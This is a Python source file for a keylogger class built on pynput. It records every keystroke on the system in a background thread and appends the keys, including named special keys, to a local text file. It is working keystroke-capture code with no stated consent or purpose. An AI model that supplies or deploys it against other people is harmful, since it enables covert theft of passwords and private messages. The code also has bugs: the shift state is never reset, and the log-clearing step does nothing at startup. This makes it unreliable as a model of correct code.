from pynput import keyboard
import threading

class Keylogger:
    def __init__(self, path="./tmp_files/keylog.txt"):
        self.path = path
        self.caps = False
        self.shift = False
        self.thread = None
        self.listener = None
        self.clear_log()

    def start(self):
        self.thread = threading.Thread(target=self._start_listening)
        self.thread.start()

    def stop(self):
        if self.thread and self.thread.is_alive():
            self._stop_listening()
            self.thread.join()

    def clear_log(self):
        if not self.thread or not self.thread.is_alive():
            return "Keylogger is not running"
        with open(self.path, "w") as file:
            file.write("")

    def read_log(self):
        if not self.thread or not self.thread.is_alive():
            return "Keylogger is not running"
        with open(self.path, "r") as file:
            content = file.read()
        if not content.strip():
            return "Log is empty"
        return content

    def _start_listening(self):
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()
        self.listener.join()

    def _stop_listening(self):
        if self.listener:
            self.listener.stop()

    def _on_press(self, key):
        try:
            if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                self.shift = True
            elif key == keyboard.Key.caps_lock:
                self.caps = not self.caps

            char = None
            if hasattr(key, 'char'):
                    char = key.char
                    if char.isalpha():
                        char = self._handle_alphabetic_keys(char)
                    with open(self.path, "a") as file:
                        file.write(char)
            else: 
                char = self._handle_special_keys(key)
                with open(self.path, "a") as file:
                        file.write(char)
        except AttributeError:
            pass

    def _handle_special_keys(self, key):
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "Enter\n",
            keyboard.Key.backspace: "Backspace",
            keyboard.Key.tab: "Tab",
            keyboard.Key.caps_lock: "Caps Lock",
            keyboard.Key.ctrl: "Ctrl",
            keyboard.Key.alt: "Alt",
            keyboard.Key.esc: "Escape",
            keyboard.Key.left: "Left",
            keyboard.Key.right: "Right",
            keyboard.Key.up: "Up",
            keyboard.Key.down: "Down",
            keyboard.Key.delete: "Delete",
            keyboard.Key.home: "Home",
            keyboard.Key.end: "End",
            keyboard.Key.page_up: "Page Up",
            keyboard.Key.page_down: "Page Down",
            keyboard.Key.insert: "Insert",
            keyboard.Key.menu: "Menu",
            keyboard.Key.media_play_pause: "Media Play/Pause",
            keyboard.Key.media_volume_mute: "Media Volume Mute",
            keyboard.Key.media_volume_up: "Media Volume Up",
            keyboard.Key.media_volume_down: "Media Volume Down",
            keyboard.Key.media_previous: "Media Previous",
            keyboard.Key.media_next: "Media Next",
            keyboard.Key.f1: "F1",
            keyboard.Key.f2: "F2",
            keyboard.Key.f3: "F3",
            keyboard.Key.f4: "F4",
            keyboard.Key.f5: "F5",
            keyboard.Key.f6: "F6",
            keyboard.Key.f7: "F7",
            keyboard.Key.f8: "F8",
            keyboard.Key.f9: "F9",
            keyboard.Key.f10: "F10",
            keyboard.Key.f11: "F11",
            keyboard.Key.f12: "F12"
        }

        if key in special_keys:
            return special_keys[key]

        return ""

    def _handle_alphabetic_keys(self, char):
        if self.shift ^ self.caps:
            char = char.upper()
        else:
            char = char.lower()
       

        return char
